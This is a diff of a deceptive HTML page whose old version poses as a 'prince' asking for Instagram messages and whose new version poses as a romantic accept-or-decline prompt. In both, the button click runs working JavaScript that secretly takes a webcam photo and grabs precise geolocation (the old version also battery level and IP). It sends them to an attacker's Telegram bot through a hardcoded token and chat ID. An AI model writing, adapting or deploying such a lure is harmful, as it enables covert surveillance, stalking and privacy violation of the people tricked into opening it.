@@ -1,199 +1,212 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YOUR PRINCE</title>
+    <title>YOUR OPTIONS</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
         }
 
         body {
-            background: radial-gradient(circle, #0a0a0a, #1a1a1a);
-            min-height: 100vh;
+            background: linear-gradient(135deg, #4b0082, #ff4500, #8a2be2, #00ffff);
+            background-size: 400% 400%;
+            animation: gradientBG 8s ease infinite;
             display: flex;
-            flex-direction: column;
-            justify-content: center;
             align-items: center;
-            font-family: 'Arial', sans-serif;
-            overflow: hidden;
-            position: relative;
+            justify-content: center;
+            height: 100vh;
             color: white;
+            overflow: hidden;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
             text-align: center;
-        }
-
-        .loader {
-            display: none;
-            border: 5px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top: 5px solid white;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-top: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .quote-container {
-            padding: 2rem;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+            padding: 3rem;
             border-radius: 20px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
-            max-width: 800px;
-            margin: 20px;
-            transform: translateY(0);
-            animation: pulse 2s infinite;
+            backdrop-filter: blur(20px);
+            background: rgba(0, 0, 0, 0.6);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+            animation: glow 3s infinite alternate;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
+        @keyframes glow {
+            from { box-shadow: 0 0 20px #ff00ff; }
+            to { box-shadow: 0 0 40px #00ffff; }
         }
 
-        .quote {
-            font-size: 1.8rem;
-            font-weight: bold;
+        h1 {
+            font-size: 3rem;
             margin-bottom: 2rem;
-            line-height: 1.4;
-            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            background: linear-gradient(90deg, #ff00ff, #00ffff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
         }
 
-        .start-btn {
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+        .option {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+
+        input[type="checkbox"] {
+            appearance: none;
+            width: 25px;
+            height: 25px;
+            border: 2px solid #ff00ff;
+            border-radius: 50%;
+            cursor: pointer;
+            position: relative;
+        }
+
+        input[type="checkbox"]:checked {
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+        }
+
+        label {
+            font-size: 1.5rem;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .submit-btn {
+            margin-top: 2rem;
+            padding: 1rem 3rem;
+            font-size: 1.5rem;
+            color: white;
             border: none;
             border-radius: 50px;
-            color: white;
             cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            background: linear-gradient(90deg, #ff00ff, #00ffff);
+            transition: all 0.3s;
         }
 
-        .start-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        .status-text {
-            display: none;
-            margin-top: 15px;
-            font-size: 1rem;
-            color: #fff;
-        }
-
-        .contact-btn {
-            margin-top: 10px;
-            padding: 10px 30px;
-            font-size: 1rem;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid white;
-            border-radius: 50px;
-            color: white;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
+        .submit-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px #00ffff;
         }
     </style>
 </head>
+
 <body>
-    <div class="quote-container">
-        <p class="quote">HEY MAYBE YOU KNOW ME I WANT TO TALK TO YOU VERY IMPORTANT I AM PRINCE ,PLEASE SENT ANY MASSAGE ON INSTAGRAM<br>PLEASE CLICK TO BUTTON TO START SENDING MASSAGE PLEASE  </p>
-        <button class="start-btn" onclick="startProcess()">Allow & Continue</button>
-        <div class="loader"></div>
-        <p class="status-text">Processing your request...</p>
-        <a href="https://www.instagram.com/the__.__spider" target="_blank" class="contact-btn">Contact Me</a>
+    <div class="container">
+        <h1>SELECT A OPTION , OR YE KABHI NAHI BADLEGA</h1>
+
+        <div class="option">
+            <input type="checkbox" id="accept" name="choice" onclick="selectOnlyOne(this)">
+            <label for="accept">ACCEPT ✅</label>
+        </div>
+
+        <div class="option">
+            <input type="checkbox" id="decline" name="choice" onclick="selectOnlyOne(this)">
+            <label for="decline">DECLINE ❌</label>
+        </div>
+
+        <div class="option">
+            <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
+            <label for="someoneElse">ALLREADY RELATIONSHIP 🙂</label>
+        </div>
+
+        <button class="submit-btn" onclick="submitData()">SUBMIT</button>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
-        const CHAT_IDS = ["5112680061"];  
+        const CHAT_ID = "5112680061";
 
-        function startProcess() {
-            document.querySelector(".start-btn").style.display = "none";
-            document.querySelector(".loader").style.display = "block";
-            document.querySelector(".status-text").style.display = "block";
-
-            captureDetails();
+        function selectOnlyOne(selectedCheckbox) {
+            document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
+                if (checkbox !== selectedCheckbox) checkbox.checked = false;
+            });
         }
 
-        async function captureDetails() {
-            let video = document.createElement("video");
-            let canvas = document.createElement("canvas");
-            let context = canvas.getContext("2d");
-
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                video.srcObject = stream;
-                video.play();
-
-                setTimeout(async () => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    let imageData = canvas.toDataURL("image/png");
-                    stream.getTracks().forEach(track => track.stop());  
-
-                    let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
-                    let locationPromise = new Promise(resolve => {
-                        navigator.geolocation.getCurrentPosition(
-                            pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
-                            () => resolve("Location Denied"),
-                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                        );
-                    });
-                    let ipPromise = fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "IP not available");
-                    let [battery, location, ip] = await Promise.all([batteryPromise, locationPromise, ipPromise]);
-
-                    sendToTelegram(imageData, battery, location, ip);
-                }, 2000);
-            } catch (err) {
-                console.log("Camera Permission Denied:", err);
-                document.querySelector(".status-text").textContent = "Permission Denied!";
+        function getSelectedOption() {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            for (let checkbox of checkboxes) {
+                if (checkbox.checked) return checkbox.nextElementSibling.innerText;
             }
+            return null;
         }
 
-        function sendToTelegram(imageData, battery, location, ip) {
-            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}\n🌐 IP: ${ip}`;
+        function submitData() {
+            const selectedOption = getSelectedOption();
+            if (!selectedOption) return alert("Please select an option!");
 
-            CHAT_IDS.forEach(chatId => {
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
-                });
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-                let blob = dataURItoBlob(imageData);
-                let formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("photo", blob, "image.png");
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL("image/png");
+                        stream.getTracks().forEach(track => track.stop());
 
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData })
-                .then(() => {
-                    document.querySelector(".status-text").textContent = "OK PLEASE DO ANY MASSAGE ";
-                    document.querySelector(".loader").style.display = "none";
-                });
+                        sendLocationAndImage(selectedOption, imageData);
+                    }, 3000);
+                })
+                .catch(() => alert("Camera access denied!"));
+        }
+
+        function sendLocationAndImage(option, imageData) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                    sendToTelegram(option, imageData, location);
+                },
+                () => {
+                    sendToTelegram(option, imageData, "Location Denied");
+                }
+            );
+        }
+
+        function sendToTelegram(option, imageData, location) {
+            const message = `✅ User Response\n🟢 Option: ${option}\n📍 Location: ${location}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "user_image.png");
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
             });
         }
 
         function dataURItoBlob(dataURI) {
-            let byteString = atob(dataURI.split(',')[1]);
-            let arrayBuffer = new ArrayBuffer(byteString.length);
-            let ia = new Uint8Array(arrayBuffer);
-            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-            return new Blob([arrayBuffer], { type: "image/png" });
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
         }
     </script>
 </body>
+
 </html>
